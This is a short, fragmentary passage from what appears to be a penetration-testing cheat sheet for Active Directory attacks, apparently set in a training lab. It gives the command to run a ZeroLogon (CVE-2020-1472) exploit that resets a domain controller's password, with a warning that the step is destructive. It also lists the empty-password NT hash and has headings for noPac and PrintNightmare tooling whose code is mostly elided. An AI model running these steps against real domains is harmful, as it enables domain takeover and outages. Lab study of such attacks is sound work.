...
- [Quick Version Checking and Mapped Vulnerability](#quick-version-checking-and-mapped-vulnerability)
...
#### 1. Reset the Password to Empty

**WARNING:** This step is destructive. It breaks the DC's ability to replicate with other DCs and will eventually crash the domain if not restored

```bash
python3 cve-2020-1472-exploit.py ACADEMY-EA-DC01 172.16.5.5
```

#### 2. Verify the password reset

empty pass NT hash = `31d6cfe0d16ae931b73c59d7e0c089c0`
...
#### [noPac](https://github.com/Ridter/noPac) scanner.py
```bash
...
NOTE: noPac.py saves the TGT on our machine once succeed!
...
#### Netexec `printnightmare` smb module
```bash
